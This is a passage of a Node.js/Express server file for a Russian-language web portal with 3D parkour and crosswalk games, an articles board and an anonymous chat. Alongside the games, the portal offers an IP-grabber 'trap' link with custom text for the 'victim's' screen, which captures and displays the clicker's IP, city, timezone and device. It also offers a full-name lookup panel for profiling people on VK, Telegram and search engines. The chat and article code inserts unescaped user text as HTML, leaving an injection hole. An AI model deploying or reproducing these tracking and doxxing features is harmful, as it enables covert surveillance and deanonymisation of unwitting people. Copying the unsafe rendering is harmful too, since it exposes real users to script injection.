const express = require('express');
const axios = require('axios');

const app = express();
const PORT = process.env.PORT || 3000;

app.use(express.json());

// === ХРАНИЛИЩА В ПАМЯТИ ===
let currentTrap = null;     
let lastResult = null;      
let globalArticles = [
    {
        id: "promo",
        title: "Портал запущен!",
        desc: "Система готова к работе.",
        content: "Все модули CtalkeP активированы. Бесконечный 3D-Паркур и 3D-Пешеход запущены! Исправлена инверсия камеры, глаза перенесены на лицо персонажей."
    }
];
let chatMessages = [];      

// === МУЛЬТИПЛЕЕР ИГРЫ ===
let onlinePlayers = {}; 

setInterval(() => {
    const now = Date.now();
    for (const nick in onlinePlayers) {
        if (now - onlinePlayers[nick].lastSeen > 7000) {
            delete onlinePlayers[nick];
        }
    }
}, 3000);

// === АВТОПИНГЕР ===
const APP_URL = process.env.RENDER_EXTERNAL_URL || `http://localhost:${PORT}`;
setInterval(() => {
    axios.get(`${APP_URL}/ping`)
        .then(() => console.log('[CtalkeP] Автопинг.'))
        .catch(err => console.log('[CtalkeP] Ошибка автопинга:', err.message));
}, 600000);

app.get('/ping', (req, res) => res.send('pong'));

// === ГЛАВНЫЙ ИНТЕРФЕЙС ===
app.get('/', (req, res) => {
    res.send(`
<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>CtalkeP | Premium Portal & 3D Games</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/three.js/r128/three.min.js"></script>
    <style>
        body { background-color: #050505; color: #e5e7eb; overflow-x: hidden; }
        .neon-border { box-shadow: 0 0 15px rgba(59, 130, 246, 0.25); }
        .neon-text { text-shadow: 0 0 8px rgba(59, 130, 246, 0.6); }
        ::-webkit-scrollbar { width: 5px; }
        ::-webkit-scrollbar-track { background: #050505; }
        ::-webkit-scrollbar-thumb { background: #1a1a1a; border-radius: 3px; }
        .joystick-zone { touch-action: none; user-select: none; }
    </style>
</head>
<body class="font-sans min-h-screen flex flex-col justify-between">

    <div id="lobbyView" class="flex flex-col min-h-screen justify-between">
        <header class="border-b border-zinc-900 bg-[#0a0a0a] p-4 sticky top-0 z-50">
            <div class="max-w-6xl mx-auto flex flex-wrap justify-between items-center gap-4">
                <h1 class="text-2xl font-black text-blue-500 tracking-widest neon-text">CtalkeP</h1>
                <div class="flex items-center gap-4">
                    <span class="text-sm bg-zinc-900 px-3 py-1.5 rounded-lg border border-zinc-800 text-zinc-400">
                        Реклама: <span class="text-red-500 font-bold">бесплатный дэфф - @defscool</span>
                    </span>
                    <span class="text-yellow-500 font-bold bg-yellow-950/30 px-3 py-1.5 rounded-lg border border-yellow-900/40" id="balanceDisplay">Баланс: $0.00</span>
                </div>
            </div>
        </header>

        <div class="max-w-6xl mx-auto w-full px-4 mt-6 grid grid-cols-1 md:grid-cols-2 gap-4">
            <button onclick="startGameMode('parkour')" class="w-full bg-gradient-to-r from-blue-600 via-indigo-600 to-purple-600 text-white font-black py-4 rounded-xl text-lg uppercase tracking-widest hover:scale-[1.01] transition shadow-lg shadow-indigo-500/20 animate-pulse">
                🎮 ОНЛАЙН 3D ПАРКУР 🎮
            </button>
            <button onclick="startGameMode('crosswalk')" class="w-full bg-gradient-to-r from-emerald-600 via-green-600 to-teal-600 text-white font-black py-4 rounded-xl text-lg uppercase tracking-widest hover:scale-[1.01] transition shadow-lg shadow-emerald-500/20">
                🚶‍♂️ ОНЛАЙН 3D ПЕШЕХОД 🚶‍♂️
            </button>
        </div>

        <main class="max-w-6xl mx-auto p-4 w-full flex-grow grid grid-cols-1 md:grid-cols-3 gap-6">
            <div class="space-y-6">
                <div class="bg-[#0a0a0a] p-5 rounded-xl border border-zinc-900 neon-border">
                    <h2 class="text-md font-bold mb-3 text-blue-400 tracking-wide uppercase">Локальный профиль</h2>
                    <div class="space-y-3">
                        <input type="text" id="nicknameInput" placeholder="Ваш никнейм" class="w-full bg-zinc-900 border border-zinc-800 rounded-lg px-3 py-2 text-sm text-white outline-none focus:border-blue-500 transition">
                        <button onclick="saveProfile()" class="w-full bg-blue-600 hover:bg-blue-700 text-white font-bold py-2 rounded-lg text-sm transition">Сохранить</button>
                    </div>
                </div>

                <div class="bg-[#0a0a0a] p-5 rounded-xl border border-zinc-900 neon-border">
                    <h2 class="text-md font-bold mb-1 text-red-500 tracking-wide uppercase">УЗНАТЬ IP-адрес</h2>
                    <p class="text-xs text-zinc-500 mb-4">Предыдущая ссылка удаляется автоматически при новой генерации.</p>
                    <div class="space-y-3 mb-4">
                        <input type="text" id="trapMessageInput" placeholder="Текст на экране жертвы (например: Твой IP))" class="w-full bg-zinc-900 border border-zinc-800 rounded-lg px-3 py-2 text-xs text-white outline-none focus:border-red-500 transition">
                    </div>
                    <button onclick="generateTrap()" class="w-full bg-red-600 hover:bg-red-700 text-white font-bold py-2 rounded-lg text-sm transition">Сгенерировать ссылку</button>
                    <div id="trapArea" class="hidden mt-4 space-y-3">
                        <input type="text" id="trapUrl" readonly class="bg-zinc-900 text-xs text-green-400 p-2 rounded-lg border border-zinc-800 w-full outline-none">
                        <div id="trapStatus" class="text-xs text-yellow-500 animate-pulse bg-yellow-950/10 p-3 rounded-lg border border-yellow-900/30">Ожидание перехода...</div>
                    </div>
                </div>

                <div class="bg-[#0a0a0a] p-5 rounded-xl border border-zinc-900 neon-border">
                    <h2 class="text-md font-bold mb-3 text-indigo-400 tracking-wide uppercase">Глубокий Поиск ФИО</h2>
                    <input type="text" id="fioInput" placeholder="Иванов Иван Иванович" class="w-full bg-zinc-900 border border-zinc-800 rounded-lg px-3 py-2 mb-3 text-sm text-white outline-none focus:border-indigo-500">
                    <button onclick="searchFIO()" class="w-full bg-indigo-600 hover:bg-indigo-700 text-white font-bold py-2 rounded-lg text-sm transition">Анализировать ФИО</button>
                    <div id="fioResults" class="mt-4 space-y-2 hidden"></div>
                </div>
            </div>

            <div class="space-y-6">
                <div class="bg-[#0a0a0a] p-5 rounded-xl border border-zinc-900 neon-border">
                    <h2 class="text-md font-bold mb-3 text-emerald-400 tracking-wide uppercase">Создать статью (+$0.50)</h2>
                    <div class="space-y-3">
                        <input type="text" id="artTitle" placeholder="Заголовок" class="w-full bg-zinc-900 border border-zinc-800 rounded-lg p-2.5 text-sm text-white">
                        <input type="text" id="artDesc" placeholder="Краткое описание" class="w-full bg-zinc-900 border border-zinc-800 rounded-lg p-2.5 text-sm text-white">
                        <textarea id="artContent" rows="4" placeholder="Текст..." class="w-full bg-zinc-900 border border-zinc-800 rounded-lg p-2.5 text-sm text-white"></textarea>
                        <button onclick="publishArticle()" class="w-full bg-emerald-600 hover:bg-emerald-700 text-white font-bold py-2 rounded-lg text-sm transition">Опубликовать</button>
                    </div>
                </div>

                <div class="bg-[#0a0a0a] p-5 rounded-xl border border-zinc-900 neon-border">
                    <h2 class="text-md font-bold mb-3 text-blue-400 tracking-wide uppercase">Публичные статьи</h2>
                    <div id="articlesList" class="space-y-3 max-h-64 overflow-y-auto pr-1"></div>
                </div>
            </div>

            <div class="space-y-6">
                <div class="bg-[#0a0a0a] p-5 rounded-xl border border-zinc-900 neon-border">
                    <h2 class="text-md font-bold mb-3 text-yellow-500 tracking-wide uppercase">Магазин привилегий</h2>
                    <div class="flex justify-between items-center bg-zinc-950 p-3 rounded-lg border border-zinc-900">
                        <div>
                            <div class="font-bold text-sm text-white">[СТ] Элитный Тэг</div>
                            <div class="text-xs text-zinc-500">Выделяет ваши сообщения</div>
                        </div>
                        <button onclick="buyTag()" class="bg-yellow-600 hover:bg-yellow-700 text-white text-xs font-bold px-3 py-2 rounded-lg transition">$15.00</button>
                    </div>
                </div>

                <div class="bg-[#0a0a0a] p-5 rounded-xl border border-zinc-900 neon-border flex flex-col h-[340px]">
                    <h2 class="text-md font-bold mb-2 text-purple-400 tracking-wide uppercase">Анонимный чат</h2>
                    <div id="chatBox" class="flex-grow overflow-y-auto bg-[#050505] p-3 rounded-lg border border-zinc-900 text-sm space-y-2 mb-3"></div>
                    <div class="flex gap-2">
                        <input type="text" id="chatMessage" placeholder="Сообщение..." class="flex-grow bg-zinc-900 border border-zinc-800 rounded-lg px-3 py-2 text-sm text-white outline-none">
                        <button onclick="sendMessage()" class="bg-purple-600 hover:bg-purple-700 px-4 rounded-lg text-sm font-bold text-white transition">Отправить</button>
                    </div>
                </div>

                <div class="bg-[#0a0a0a] p-5 rounded-xl border border-zinc-900 neon-border">
                    <h2 class="text-md font-bold mb-2 text-zinc-400 tracking-wide uppercase">Активность профиля</h2>
                    <div id="statsBox" class="text-sm"></div>
                </div>
            </div>
        </main>
    </div>

    <div id="gameView" class="hidden fixed inset-0 z-50 bg-[#020202] select-none flex flex-col overflow-hidden">
        <div class="absolute top-4 left-4 right-4 flex justify-between items-center z-50 pointer-events-none">
            <div class="bg-black/95 px-4 py-2.5 rounded-lg border border-zinc-800 flex flex-col gap-1 pointer-events-auto">
                <div class="flex items-center gap-3">
                    <span class="text-xs text-zinc-400">Игрок:</span>
                    <span class="text-sm font-bold text-blue-400" id="gameUserNick">Аноним</span>
                    <span class="text-xs bg-green-900/40 text-green-400 px-2 py-0.5 rounded border border-green-900/40" id="pingIndicator">СЕТЬ: OK</span>
                </div>
                <div class="text-[10px] text-zinc-500 id="mouseLockTip">Кликни по экрану, чтобы захватить мышь. Выход — ESC.</div>
            </div>
            
            <div class="bg-black/95 px-6 py-3 rounded-lg border border-blue-500/30 flex flex-col items-center pointer-events-auto neon-border">
                <span class="text-[10px] uppercase text-zinc-400 font-bold tracking-widest" id="gameScoreLabel">Дистанция</span>
                <span class="text-xl font-black text-blue-400 font-mono" id="distanceMeter">0.0м</span>
            </div>

            <button onclick="exitGame()" class="bg-red-600 hover:bg-red-700 text-white font-bold px-5 py-2.5 rounded-lg text-sm transition pointer-events-auto shadow-lg shadow-red-900/20">
                ВЫЙТИ В ЛОББИ
            </button>
        </div>

        <div id="threeJsContainer" class="w-full h-full cursor-pointer"></div>

        <div id="mobileControls" class="hidden absolute inset-0 pointer-events-none select-none">
            <div id="joystickBoundary" class="absolute bottom-10 left-10 w-32 h-32 bg-white/5 border border-white/10 rounded-full flex items-center justify-center pointer-events-auto joystick-zone">
                <div id="joystickKnob" class="w-12 h-12 bg-blue-500/80 rounded-full"></div>
            </div>
            <div id="jumpButton" class="absolute bottom-12 right-12 w-20 h-20 bg-blue-600/60 active:bg-blue-600/90 border border-blue-500 rounded-full flex items-center justify-center pointer-events-auto shadow-lg shadow-blue-500/20 active:scale-95 transition">
                <span class="text-white text-xs font-bold uppercase tracking-wider" id="mobileActionText">UP</span>
            </div>
        </div>
    </div>

    <div id="articleModal" class="hidden fixed inset-0 bg-black/90 flex items-center justify-center p-4 z-50">
        <div class="bg-[#0a0a0a] p-6 rounded-xl border border-zinc-800 max-w-lg w-full">
            <h2 id="modalTitle" class="text-xl font-bold text-blue-400 mb-2"></h2>
            <div id="modalContent" class="text-zinc-300 text-sm whitespace-pre-line mb-4 max-h-96 overflow-y-auto"></div>
            <button onclick="closeModal()" class="w-full bg-zinc-800 hover:bg-zinc-700 py-2 rounded-lg text-white font-bold transition">Закрыть</button>
        </div>
    </div>

    <script>
        let myNickname = localStorage.getItem('nickname') || 'Игрок_' + Math.floor(Math.random()*900 + 100);
        let myBalance = parseFloat(localStorage.getItem('balance')) || 0.0;
        let hasTag = localStorage.getItem('hasTag') === 'true';
        let dailyVisits = parseInt(localStorage.getItem('dailyVisits')) || 0;
        let lastVisitDate = localStorage.getItem('lastVisitDate');
        let localArticles = JSON.parse(localStorage.getItem('saved_articles')) || [];

        document.getElementById('nicknameInput').value = myNickname.startsWith('Игрок_') ? '' : myNickname;
        updateUI();

        const today = new Date().toDateString();
        if (lastVisitDate !== today) {
            dailyVisits += 1;
            localStorage.setItem('dailyVisits', dailyVisits);
            localStorage.setItem('lastVisitDate', today);
        }

        function updateUI() {
            document.getElementById('balanceDisplay').textContent = 'Баланс: $' + myBalance.toFixed(2);
            document.getElementById('statsBox').innerHTML = '<div class="flex justify-between items-center"><span>👤 ' + myNickname + '</span><span class="text-emerald-400 font-bold">' + dailyVisits + ' вх.</span></div>';
        }

        function saveProfile() {
            const input = document.getElementById('nicknameInput').value.trim();
            myNickname = input || 'Игрок_' + Math.floor(Math.random()*900 + 100);
            localStorage.setItem('nickname', myNickname);
            updateUI();
            alert('Профиль обновлен!');
        }

        function searchFIO() {
            const query = document.getElementById('fioInput').value.trim();
            if (!query) return alert('Введите ФИО!');
            const resultsBox = document.getElementById('fioResults');
            resultsBox.classList.remove('hidden');
            const encoded = encodeURIComponent(query);
            resultsBox.innerHTML = \`
                <div class="p-3 bg-zinc-950 rounded-lg border border-zinc-900 text-xs space-y-2">
                    <div class="text-zinc-400 font-bold border-b border-zinc-900 pb-1">Анализ ФИО: "\${query}"</div>
                    <a href="https://vk.com/people/\${encoded}" target="_blank" class="block text-blue-400 hover:underline">🌐 Пробить ВКонтакте (Прямой поиск)</a>
                    <a href="https://t.me/search?q=\${encoded}" target="_blank" class="block text-cyan-400 hover:underline">💬 Упоминания в Telegram</a>
                    <a href="https://yandex.ru/search/?text=\${encoded}" target="_blank" class="block text-amber-500 hover:underline">🔍 Поиск в Яндекс</a>
                    <a href="https://www.google.com/search?q=\${encoded}" target="_blank" class="block text-red-400 hover:underline">🔍 Поиск в Google</a>
                </div>
            \`;
        }

        let trapCheckInterval = null;
        async function generateTrap() {
            const msgInput = document.getElementById('trapMessageInput').value.trim();
            const res = await fetch('/api/ip/create', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ customText: msgInput })
            });
            const data = await res.json();
            if(data.success) {
                const trapArea = document.getElementById('trapArea');
                const trapUrl = document.getElementById('trapUrl');
                const trapStatus = document.getElementById('trapStatus');
                trapArea.classList.remove('hidden');
                trapUrl.value = data.link;
                trapStatus.textContent = "Ссылка активна. Ждем клика...";
                if (trapCheckInterval) clearInterval(trapCheckInterval);
                trapCheckInterval = setInterval(async () => {
                    const statusRes = await fetch('/api/ip/status');
                    const statusData = await statusRes.json();
                    if (statusData.status === 'caught') {
                        clearInterval(trapCheckInterval);
                        trapStatus.className = "text-xs text-green-400 bg-green-950/10 p-3 rounded-lg border border-green-900/30";
                        trapStatus.innerHTML = '<strong>ПЕРЕХОД ЗАФИКСИРОВАН!</strong><br>IP: ' + statusData.data.ip + '<br>Город: ' + statusData.data.city + '<br>Часовой пояс: ' + statusData.data.timezone + '<br>Устройство: ' + statusData.data.device.substring(0,50) + '...';
                    }
                }, 2000);
            }
        }

        async function loadArticles() {
            try {
                const res = await fetch('/api/articles');
                const serverArticles = await res.json();
                const allArticles = [...serverArticles];
                localArticles.forEach(localArt => {
                    if (!allArticles.some(a => a.id === localArt.id)) allArticles.push(localArt);
                });
                const list = document.getElementById('articlesList');
                list.innerHTML = '';
                allArticles.forEach(art => {
                    const div = document.createElement('div');
                    div.className = "bg-zinc-950 p-3 rounded-lg border border-zinc-900 hover:border-zinc-800 cursor-pointer transition";
                    div.onclick = () => openArticle(art);
                    div.innerHTML = '<h3 class="font-bold text-sm text-white">' + art.title + '</h3><p class="text-xs text-zinc-500">' + art.desc + '</p>';
                    list.appendChild(div);
                });
            } catch (e) {}
        }

        async function publishArticle() {
            const title = document.getElementById('artTitle').value.trim();
            const desc = document.getElementById('artDesc').value.trim();
            const content = document.getElementById('artContent').value.trim();
            if(!title || !content) return alert('Заполните поля!');
            const newArt = { id: Math.random().toString(36).substring(2, 10), title, desc: desc || "Без описания", content };
            localArticles.push(newArt);
            localStorage.setItem('saved_articles', JSON.stringify(localArticles));
            try {
                await fetch('/api/articles', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(newArt)
                });
            } catch (e) {}
            myBalance += 0.50;
            localStorage.setItem('balance', myBalance);
            updateUI();
            document.getElementById('artTitle').value = '';
            document.getElementById('artDesc').value = '';
            document.getElementById('artContent').value = '';
            alert('Статья создана! Начислено $0.50');
            loadArticles();
        }

        function openArticle(art) {
            document.getElementById('modalTitle').textContent = art.title;
            document.getElementById('modalContent').textContent = art.content;
            document.getElementById('articleModal').classList.remove('hidden');
        }
        function closeModal() { document.getElementById('articleModal').classList.add('hidden'); }

        async function fetchMessages() {
            try {
                const res = await fetch('/api/chat/messages');
                const data = await res.json();
                const chatBox = document.getElementById('chatBox');
                if (data.length !== chatBox.children.length) {
                    chatBox.innerHTML = '';
                    data.forEach(msg => {
                        const div = document.createElement('div');
                        const tagSpan = msg.tag ? '<span class="text-yellow-400 font-bold mr-1">' + msg.tag + '</span>' : '';
                        div.innerHTML = '<span class="text-zinc-600 text-[10px]">[' + msg.time + ']</span> ' + tagSpan + '<strong class="text-purple-400">' + msg.username + ':</strong> <span class="text-zinc-200">' + msg.text + '</span>';
                        chatBox.appendChild(div);
                    });
                    chatBox.scrollTop = chatBox.scrollHeight;
                }
            } catch (e) {}
        }
        setInterval(fetchMessages, 2000);

        async function sendMessage() {
            const input = document.getElementById('chatMessage');
            const text = input.value.trim();
            if(!text) return;
            await fetch('/api/chat/send', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ username: myNickname, text: text, tag: hasTag ? '[СТ]' : '' })
            });
            input.value = '';
            fetchMessages();
        }

        function buyTag() {
            if(hasTag) return alert('Тэг уже куплен!');
            if(myBalance < 15.00) return alert('Нужно $15.00!');
            myBalance -= 15.00;
            hasTag = true;
            localStorage.setItem('balance', myBalance);
            localStorage.setItem('hasTag', 'true');
            updateUI();
            alert('Тэг куплен!');
        }

        loadArticles();
        fetchMessages();

        // ==========================================
        //       🎨 ОБЩАЯ СИСТЕМА ДЛЯ 3D ИГР
        // ==========================================
        let scene, camera, renderer;
        let platforms = []; 
        let otherPlayers = {}; 
        let isGameActive = false;
        let currentGameMode = 'parkour'; // 'parkour' или 'crosswalk'
        let multiplayerInterval = null;

        // Физика и позиция локального игрока
        let playerPos = { x: 0, y: 1.5, z: 0 };
        let playerVelocity = { x: 0, y: 0, z: 0 };
        let cameraRot = { pitch: 0, yaw: 0 }; 
        let isGrounded = false;
        
        // Физические константы
        const gravity = -23.5;  
        const jumpStrength = 9.3; 
        const moveSpeed = 7.4;   

        let keys = { w: false, a: false, s: false, d: false, space: false };
        let isTouchDevice = false;
        let joystickActive = false;
        let joystickStart = { x: 0, y: 0 };
        let touchMoveVector = { x: 0, z: 0 };

        // Локальный рандомайзер для бесконечной генерации
        let mapSeed = 98765;
        function localRandom() {
            let x = Math.sin(mapSeed++) * 10000;
            return x - Math.floor(x);
        }

        if ('ontouchstart' in window || navigator.maxTouchPoints > 0) {
            isTouchDevice = true;
        }

        function startGameMode(mode) {
            currentGameMode = mode;
            document.getElementById('lobbyView').classList.add('hidden');
            document.getElementById('gameView').classList.remove('hidden');
            document.getElementById('gameUserNick').textContent = myNickname;
            isGameActive = true;

            const jumpBtn = document.getElementById('jumpButton');
            const actionText = document.getElementById('mobileActionText');
            const scoreLabel = document.getElementById('gameScoreLabel');
            
            if (currentGameMode === 'crosswalk') {
                scoreLabel.textContent = "Пройдено дорог";
                if (isTouchDevice) {
                    jumpBtn.classList.add('hidden'); // прячем прыжок в пешеходе
                }
            } else {
                scoreLabel.textContent = "Дистанция";
                if (isTouchDevice) {
                    jumpBtn.classList.remove('hidden');
                    actionText.textContent = "UP";
                }
            }

            if (isTouchDevice) {
                document.getElementById('mobileControls').classList.remove('hidden');
                setupMobileEvents();
            } else {
                setupPointerLock();
            }

            init3D();
            setupPhysicsEvents();
            startMultiplayerLoop();
        }

        function setupPointerLock() {
            const container = document.getElementById('threeJsContainer');
            container.addEventListener('click', () => {
                container.requestPointerLock();
            });
        }

        function exitGame() {
            isGameActive = false;
            clearInterval(multiplayerInterval);
            document.exitPointerLock();
            
            window.removeEventListener('keydown', handleKeyDown);
            window.removeEventListener('keyup', handleKeyUp);
            window.removeEventListener('mousemove', handleMouseMove);
            window.removeEventListener('resize', onWindowResize);

            const container = document.getElementById('threeJsContainer');
            container.innerHTML = '';

            document.getElementById('gameView').classList.add('hidden');
            document.getElementById('lobbyView').classList.remove('hidden');
            updateUI();
        }

        // ==========================================
        //       🚗 ПЕРЕМЕННЫЕ РЕЖИМА "ПЕШЕХОД"
        // ==========================================
        let roads = []; 
        let vehicles = []; 
        let nextRoadZ = -5;
        const roadWidth = 60; // ширина трассы

        function init3D() {
            const container = document.getElementById('threeJsContainer');
            
            scene = new THREE.Scene();
            scene.fog = new THREE.FogExp2('#050505', 0.015);

            camera = new THREE.PerspectiveCamera(65, window.innerWidth / window.innerHeight, 0.1, 1000);
            camera.position.set(playerPos.x, playerPos.y, playerPos.z);

            renderer = new THREE.WebGLRenderer({ antialias: true });
            renderer.setSize(window.innerWidth, window.innerHeight);
            renderer.setPixelRatio(Math.min(window.devicePixelRatio, 2));
            renderer.setClearColor('#050505', 1);
            container.appendChild(renderer.domElement);

            const ambientLight = new THREE.AmbientLight(0xffffff, 0.4);
            scene.add(ambientLight);

            const dirLight = new THREE.DirectionalLight(0x3b82f6, 1.8);
            dirLight.position.set(10, 50, -10);
            scene.add(dirLight);

            if (currentGameMode === 'parkour') {
                const gridHelper = new THREE.GridHelper(600, 60, 0x3b82f6, 0x111111);
                gridHelper.position.y = -20;
                scene.add(gridHelper);
                resetInfiniteMap();
            } else {
                resetCrosswalkMap();
            }

            let lastTime = performance.now();
            function animate(time) {
                if (!isGameActive) return;
                requestAnimationFrame(animate);

                const dt = Math.min((time - lastTime) / 1000, 0.1); 
                lastTime = time;

                if (currentGameMode === 'parkour') {
                    updatePlayerPhysics(dt);
                    updateInfiniteWorld();
                } else {
                    updateCrosswalkPhysics(dt);
                    updateCrosswalkWorld();
                }
                updateCamera();
                renderOtherPlayers();

                renderer.render(scene, camera);
            }
            requestAnimationFrame(animate);

            window.addEventListener('resize', onWindowResize);
        }

        // === ПРОЦЕДУРНАЯ БЕСКОНЕЧНАЯ ГЕНЕРАЦИЯ (ПАРКУР) ===
        let nextPlatformZ = -3.5; 
        let lastPlatformX = 0;
        let lastPlatformY = 0;

        function resetInfiniteMap() {
            platforms.forEach(p => scene.remove(p.mesh));
            platforms = [];
            createPlatform(0, 0, 0, 6, 0.8, 6, "#3b82f6");
            nextPlatformZ = -3.5;
            lastPlatformX = 0;
            lastPlatformY = 0;
            mapSeed = 98765;
            for (let i = 0; i < 20; i++) {
                spawnNextBlock();
            }
            respawnPlayer();
        }

        function createPlatform(x, y, z, w, h, d, color) {
            const geometry = new THREE.BoxGeometry(w, h, d);
            const material = new THREE.MeshPhongMaterial({
                color: new THREE.Color(color),
                emissive: new THREE.Color(color),
                emissiveIntensity: 0.45,
                shininess: 80
            });
            const mesh = new THREE.Mesh(geometry, material);
            mesh.position.set(x, y, z);
            scene.add(mesh);
            platforms.push({ mesh, x, y, z, w, h, d });
        }

        function spawnNextBlock() {
            let distZ = -(localRandom() * 1.1 + 3.3); 
            let distX = (localRandom() - 0.5) * 3.8; 
            let distY = (localRandom() - 0.4) * 1.3; 

            lastPlatformX += distX;
            lastPlatformY += distY;
            nextPlatformZ += distZ;

            if (lastPlatformY < -5) lastPlatformY = -3;
            if (lastPlatformY > 5) lastPlatformY = 2;

            const colors = ["#ef4444", "#10b981", "#8b5cf6", "#f59e0b", "#ec4899", "#06b6d4"];
            const color = colors[Math.floor(localRandom() * colors.length)];

            createPlatform(
                parseFloat(lastPlatformX.toFixed(2)),
                parseFloat(lastPlatformY.toFixed(2)),
                parseFloat(nextPlatformZ.toFixed(2)),
                2.0, 0.6, 2.0, color
            );
        }

        function updateInfiniteWorld() {
            const triggerZ = nextPlatformZ + 40; 
            if (playerPos.z < triggerZ) {
                for (let i = 0; i < 10; i++) {
                    spawnNextBlock();
                }
                const playerPassedZ = playerPos.z + 50;
                platforms = platforms.filter(p => {
                    if (p.z > playerPassedZ && p.z !== 0) { 
                        scene.remove(p.mesh);
                        return false;
                    }
                    return true;
                });
            }
            const currentDistance = Math.max(0, -playerPos.z);
            document.getElementById('distanceMeter').textContent = currentDistance.toFixed(1) + "м";
        }

        // ==========================================
        //       🎮 МЕХАНИКА РЕЖИМА "ПЕШЕХОД"
        // ==========================================
        function resetCrosswalkMap() {
            roads.forEach(r => scene.remove(r.mesh));
            vehicles.forEach(v => scene.remove(v.mesh));
            roads = [];
            vehicles = [];
            nextRoadZ = -5;
            mapSeed = 54321;

            // Начальная безопасная зона (газон)
            createRoadSegment(0, 10, "#10b981", false); // Безопасная зона

            // Генерируем стартовые дороги
            for (let i = 0; i < 15; i++) {
                spawnNextRoad();
            }
            respawnPlayer();
        }

        function createRoadSegment(z, depth, color, isDanger) {
            const geometry = new THREE.BoxGeometry(roadWidth, 1.0, depth);
            const material = new THREE.MeshPhongMaterial({
                color: new THREE.Color(color),
                shininess: 10
            });
            const mesh = new THREE.Mesh(geometry, material);
            mesh.position.set(0, -0.5, z);
            scene.add(mesh);

            roads.push({
                mesh: mesh,
                z: z,
                depth: depth,
                isDanger: isDanger
            });
        }

        function spawnNextRoad() {
            const depth = 4.0; // ширина полосы движения
            const isDanger = localRandom() > 0.25; // 75% вероятность дороги с машинами
            const zPos = nextRoadZ - (depth / 2);
            nextRoadZ -= depth;

            if (isDanger) {
                createRoadSegment(zPos, depth, "#1f2937", true); // Асфальтовая дорога

                // Характеристики полосы движения
                const speed = (localRandom() * 8.0 + 7.0); // сбалансированная скорость
                const direction = localRandom() > 0.5 ? 1 : -1;
                const carColor = ["#ef4444", "#3b82f6", "#f59e0b", "#ec4899", "#8b5cf6", "#e11d48"][Math.floor(localRandom() * 6)];

                // Создаем 3-4 машины на полосу с безопасными зазорами
                for (let j = 0; j < 3; j++) {
                    const startX = -roadWidth/2 + (localRandom() * 15) + (j * 20);
                    createVehicle(startX, zPos, speed, direction, carColor);
                }
            } else {
                createRoadSegment(zPos, depth, "#047857", false); // Безопасный зелёный островок
            }
        }

        function createVehicle(startX, z, speed, direction, color) {
            const carWidth = 3.2;
            const carHeight = 1.3;
            const carLength = 1.8;

            const carGroup = new THREE.Group();

            // Кузов машины
            const bodyGeo = new THREE.BoxGeometry(carWidth, carHeight, carLength);
            const bodyMat = new THREE.MeshPhongMaterial({ color: color, shininess: 50 });
            const bodyMesh = new THREE.Mesh(bodyGeo, bodyMat);
            bodyMesh.position.y = carHeight / 2;
            carGroup.add(bodyMesh);

            // Кабина машины
            const cabinGeo = new THREE.BoxGeometry(carWidth * 0.6, carHeight * 0.6, carLength * 0.95);
            const cabinMat = new THREE.MeshPhongMaterial({ color: "#111827", shininess: 80 });
            const cabinMesh = new THREE.Mesh(cabinGeo, cabinMat);
            cabinMesh.position.set(-carWidth * 0.1, carHeight, 0);
            carGroup.add(cabinMesh);

            carGroup.position.set(startX, 0, z);
            scene.add(carGroup);

            vehicles.push({
                mesh: carGroup,
                z: z,
                speed: speed,
                dir: direction,
                width: carWidth,
                length: carLength
            });
        }

        function updateCrosswalkPhysics(dt) {
            // В пешеходе нет прыжков — гравитация прижимает игрока к плоскости
            playerVelocity.y += gravity * dt;

            let moveX = 0;
            let moveZ = 0;

            if (!isTouchDevice) {
                if (keys.w) moveZ -= 1;
                if (keys.s) moveZ += 1;
                if (keys.a) moveX -= 1;
                if (keys.d) moveX += 1;
            } else {
                moveX = touchMoveVector.x;
                moveZ = touchMoveVector.z;
            }

            const sin = Math.sin(cameraRot.yaw);
            const cos = Math.cos(cameraRot.yaw);
            
            let worldMoveX = moveX * cos + moveZ * sin;
            let worldMoveZ = -moveX * sin + moveZ * cos;

            const length = Math.sqrt(worldMoveX * worldMoveX + worldMoveZ * worldMoveZ);
            if (length > 0) {
                worldMoveX = (worldMoveX / length) * moveSpeed;
                worldMoveZ = (worldMoveZ / length) * moveSpeed;
            }

            playerPos.x += worldMoveX * dt;
            playerPos.z += worldMoveZ * dt;
            playerPos.y += playerVelocity.y * dt;

            // Столкновение с плоскостью земли (всегда Y=0)
            if (playerPos.y <= 0) {
                playerPos.y = 0;
                playerVelocity.y = 0;
                isGrounded = true;
            }

            // Барьеры ширины дороги (чтобы игрок не убегал за карту)
            if (playerPos.x < -roadWidth/2 + 1) playerPos.x = -roadWidth/2 + 1;
            if (playerPos.x > roadWidth/2 - 1) playerPos.x = roadWidth/2 - 1;

            // ПРОВЕРКА КОЛЛИЗИЙ С МАШИНАМИ (СМЕРТЬ И СБРОС)
            const playerRadius = 0.45;
            vehicles.forEach(v => {
                const dx = Math.abs(playerPos.x - v.mesh.position.x);
                const dz = Math.abs(playerPos.z - v.mesh.position.z);
                
                // Если произошло столкновение (AABB коллизия)
                if (dx < (v.width/2 + playerRadius) && dz < (v.length/2 + playerRadius)) {
                    respawnPlayer();
                }
            });
        }

        function updateCrosswalkWorld() {
            // Двигаем машины
            vehicles.forEach(v => {
                v.mesh.position.x += v.speed * v.dir * 0.016;

                // Бесшовный телепорт машин (выезжают из невидимости за краем тумана)
                const bound = roadWidth / 2 + 5;
                if (v.dir === 1 && v.mesh.position.x > bound) {
                    v.mesh.position.x = -bound;
                } else if (v.dir === -1 && v.mesh.position.x < -bound) {
                    v.mesh.position.x = bound;
                }
            });

            // Генерация дорог впереди
            const triggerZ = nextRoadZ + 40;
            if (playerPos.z < triggerZ) {
                for (let i = 0; i < 8; i++) {
                    spawnNextRoad();
                }

                // Оптимизация: Удаляем старые пройденные дороги и машины
                const playerPassedZ = playerPos.z + 40;
                roads = roads.filter(r => {
                    if (r.z > playerPassedZ && r.z !== 0) {
                        scene.remove(r.mesh);
                        return false;
                    }
                    return true;
                });

                vehicles = vehicles.filter(v => {
                    if (v.z > playerPassedZ) {
                        scene.remove(v.mesh);
                        return false;
                    }
                    return true;
                });
            }

